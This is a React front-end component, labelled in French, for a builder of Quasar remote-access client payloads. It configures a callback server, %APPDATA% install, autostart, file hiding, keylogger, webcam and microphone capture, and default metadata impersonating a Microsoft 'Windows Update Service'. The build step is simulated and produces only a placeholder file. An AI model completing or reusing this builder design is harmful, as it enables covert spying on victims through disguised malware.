import React, { useState, useCallback, useMemo } from 'react';
import { Package, Download, Settings, Shield, Zap, AlertTriangle, CheckCircle } from 'lucide-react';
import toast from 'react-hot-toast';
import axios from 'axios';

const PayloadBuilder = () => {
  const [config, setConfig] = useState({
    host: 'localhost',
    port: '4782',
    password: '',
    installPath: '%APPDATA%',
    installName: 'client.exe',
    startup: true,
    hideFile: true,
    enableKeylogger: false,
    enableWebcam: false,
    enableMicrophone: false,
    reconnectDelay: 5000,
    enableUPnP: false,
    enableProxy: false,
    proxyHost: '',
    proxyPort: '',
    description: 'Windows Update Service',
    company: 'Microsoft Corporation',
    version: '1.0.0.0'
  });

  const [building, setBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);

  // Utiliser useCallback pour éviter les re-renders inutiles
  const handleInputChange = useCallback((e) => {
    const { name, value, type, checked } = e.target;
    setConfig(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  }, []);

  const validateConfig = () => {
    if (!config.host || !config.port || !config.password) {
      toast.error('Veuillez remplir tous les champs obligatoires');
      return false;
    }
    
    if (isNaN(config.port) || config.port < 1 || config.port > 65535) {
      toast.error('Le port doit être un nombre entre 1 et 65535');
      return false;
    }

    if (config.password.length < 6) {
      toast.error('Le mot de passe doit contenir au moins 6 caractères');
      return false;
    }

    return true;
  };

  const buildPayload = async () => {
    if (!validateConfig()) return;

    setBuilding(true);
    setBuildProgress(0);

    try {
      // Simulation du processus de build
      const steps = [
        'Préparation de la configuration...',
        'Compilation du client...',
        'Application des paramètres...',
        'Génération du payload...',
        'Finalisation...'
      ];

      for (let i = 0; i < steps.length; i++) {
        toast.loading(steps[i], { id: 'build-progress' });
        setBuildProgress((i + 1) * 20);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      // Ici on appellerait l'API pour générer le payload réel
      toast.success('Payload généré avec succès !', { id: 'build-progress' });
      
      // Simuler le téléchargement
      const blob = new Blob(['Contenu du payload simulé'], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = config.installName;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

    } catch (error) {
      toast.error('Erreur lors de la génération du payload');
      console.error(error);
    } finally {
      setBuilding(false);
      setBuildProgress(0);
    }
  };

  const ConfigSection = ({ title, icon: Icon, children }) => (
    <div className="discord-card">
      <div className="flex items-center mb-4">
        <Icon className="w-5 h-5 text-discord-blurple mr-2" />
        <h3 className="text-lg font-semibold text-white">{title}</h3>
      </div>
      {children}
    </div>
  );

  return (
    <div className="space-y-6 fade-in">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white mb-2">Générateur de Payload</h1>
          <p className="text-discord-light">Configurez et générez votre client Quasar personnalisé</p>
        </div>
        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-2 text-sm">
            <Shield className="w-4 h-4 text-discord-green" />
            <span className="text-discord-light">Sécurisé</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Configuration Forms */}
        <div className="lg:col-span-2 space-y-6">
          {/* Connection Settings */}
          <ConfigSection title="Paramètres de Connexion" icon={Settings}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Adresse du serveur *
                </label>
                <input
                  type="text"
                  name="host"
                  value={config.host}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="192.168.1.100"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Port *
                </label>
                <input
                  type="number"
                  name="port"
                  value={config.port}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="4782"
                  min="1"
                  max="65535"
                />
              </div>
              <div className="md:col-span-2">
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Mot de passe *
                </label>
                <input
                  type="password"
                  name="password"
                  value={config.password}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="Mot de passe sécurisé"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-discord-lighter mb-2">
                  Délai de reconnexion (ms)
                </label>
                <input
                  type="number"
                  name="reconnectDelay"
                  value={config.reconnectDelay}
                  onChange={handleInputChange}
                  className="discord-input"
                  placeholder="5000"
                />
              </div>
            </div>
          </ConfigSection>

          {/* Installation Settings */}
          <ConfigSection title="Paramètres d'Installation" icon={Package}>
            <div className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-discord-lighter mb-2">
                    Chemin d'installation
                  </label>
                  <input
                    type="text"
                    name="installPath"
                    value={config.installPath}
                    onChange={handleInputChange}
                    className="discord-input"
                    placeholder="%APPDATA%"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-discord-lighter mb-2">
                    Nom du fichier
                  </label>
                  <input
                    type="text"
                    name="installName"
                    value={config.installName}
                    onChange={handleInputChange}
                    className="discord-input"
                    placeholder="client.exe"
                  />
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    name="startup"
                    checked={config.startup}
                    onChange={handleInputChange}
                    className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                  />
                  <span className="text-discord-light">Démarrage automatique</span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    name="hideFile"
                    checked={config.hideFile}
                    onChange={handleInputChange}
                    className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                  />
                  <span className="text-discord-light">Masquer le fichier</span>
                </label>
              </div>
            </div>
          </ConfigSection>

          {/* Feature Settings */}
          <ConfigSection title="Fonctionnalités" icon={Zap}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableKeylogger"
                  checked={config.enableKeylogger}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">Keylogger</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableWebcam"
                  checked={config.enableWebcam}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">Webcam</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableMicrophone"
                  checked={config.enableMicrophone}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">Microphone</span>
              </label>
              <label className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  name="enableUPnP"
                  checked={config.enableUPnP}
                  onChange={handleInputChange}
                  className="rounded bg-discord-gray-700 border-discord-gray-600 text-discord-blurple focus:ring-discord-blurple focus:ring-offset-discord-gray-800"
                />
                <span className="text-discord-light">UPnP</span>
              </label>
            </div>
          </ConfigSection>
        </div>

        {/* Build Panel */}
        <div className="space-y-6">
          {/* Build Status */}
          <div className="discord-card">
            <h3 className="text-lg font-semibold text-white mb-4 flex items-center">
              <Package className="w-5 h-5 text-discord-blurple mr-2" />
              Génération
            </h3>
            
            {building && (
              <div className="mb-4">
                <div className="w-full bg-discord-gray-700 rounded-full h-2 mb-2">
                  <div
                    className="bg-discord-blurple h-2 rounded-full transition-all duration-300"
                    style={{ width: `${buildProgress}%` }}
                  ></div>
                </div>
                <p className="text-sm text-discord-light text-center">{buildProgress}%</p>
              </div>
            )}

            <button
              onClick={buildPayload}
              disabled={building}
              className="w-full discord-button flex items-center justify-center space-x-2 py-3"
            >
              {building ? (
                <>
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                  <span>Génération...</span>
                </>
              ) : (
                <>
                  <Download className="w-4 h-4" />
                  <span>Générer Payload</span>
                </>
              )}
            </button>
          </div>

          {/* Configuration Summary */}
          <div className="discord-card">
            <h3 className="text-lg font-semibold text-white mb-4">Résumé</h3>
            <div className="space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="text-discord-light">Serveur:</span>
                <span className="text-white">{config.host}:{config.port}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-discord-light">Installation:</span>
                <span className="text-white">{config.installPath}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-discord-light">Démarrage auto:</span>
                <span className={config.startup ? "text-discord-green" : "text-discord-red"}>
                  {config.startup ? "Activé" : "Désactivé"}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-discord-light">Keylogger:</span>
                <span className={config.enableKeylogger ? "text-discord-green" : "text-discord-red"}>
                  {config.enableKeylogger ? "Activé" : "Désactivé"}
                </span>
              </div>
            </div>
          </div>

          {/* Warning */}
          <div className="bg-discord-red bg-opacity-10 border border-discord-red rounded-lg p-4">
            <div className="flex items-start space-x-3">
              <AlertTriangle className="w-5 h-5 text-discord-red flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="text-sm font-medium text-discord-red mb-1">Avertissement</h4>
                <p className="text-xs text-discord-light">
                  Ce payload doit être utilisé uniquement dans un cadre légal et autorisé. 
                  L'utilisation non autorisée peut violer les lois locales.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PayloadBuilder;